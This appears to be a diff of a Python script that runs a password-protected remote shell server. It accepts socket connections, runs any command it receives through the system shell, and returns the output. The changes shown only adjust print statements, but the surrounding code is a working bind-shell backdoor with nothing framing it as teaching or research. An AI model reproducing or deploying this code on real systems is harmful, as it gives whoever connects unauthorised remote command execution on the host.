@@ -33,14 +33,13 @@ server = socket.socket()
 server.bind((HOST, PORT))
 password, client, client_addr = lookForConnection(server)
 passwords_match = checkPass(password, client, client_addr)
-print(passwords_match)
 
 while passwords_match == False:
     password, client, client_addr = lookForConnection(server)
     passwords_match = checkPass(password, client, client_addr)
 
 while passwords_match == True:
-    print("[-] Awaiting commands...")
+    print("Awaiting commands...")
     command = client.recv(1024)
     command = command.decode()
     if command == "exit":
@@ -50,23 +49,24 @@ while passwords_match == True:
         client.close()
         password, client, client_addr = lookForConnection(server)
         passwords_match = checkPass(password, client, client_addr)
-        print(passwords_match)
     elif command[:2] == "cd" or command[:5] == "chdir":
         if command[:2] == "cd":
             try:
                 os.chdir(command[3:])
                 client.send(("Moved Directories").encode())
+                print("Sending response...")
             except OSError:
                 print("cd did not work")
         else:
             try:
                 os.chdir(command[6:])
                 client.send(("Moved Directories").encode())
+                print("Sending response...")
             except OSError:
                 print("cd did not work")
     else:
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
         output_error = op.stderr.read()
-        print("[-] Sending response...")
+        print("Sending response...")
         client.send(output + output_error)
